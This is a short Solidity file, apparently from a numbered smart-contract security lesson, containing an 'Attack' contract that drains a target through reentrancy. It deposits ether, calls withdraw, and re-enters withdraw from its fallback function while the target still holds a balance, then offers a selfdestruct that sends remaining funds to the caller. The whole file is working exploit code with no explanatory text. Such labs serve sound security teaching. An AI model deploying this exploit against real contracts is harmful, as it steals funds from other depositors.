pragma solidity ^0.5.0;
import "./5_Reentrancy.sol";

contract Attack {
    Reentrancy public reentrancy;

    constructor(address payable _reentrancyAddress) public {
        reentrancy = Reentrancy(_reentrancyAddress);
    }

    function attack() external payable {
        require(msg.value >= 0.001 ether);
        reentrancy.deposit.value(msg.value)();
        reentrancy.withdraw(msg.value);
    }

    function() external payable {
        if (address(reentrancy).balance >= 0.001 ether) {
            reentrancy.withdraw(msg.value);
        }
    }

    function kill() external {
        selfdestruct(msg.sender);
    }


}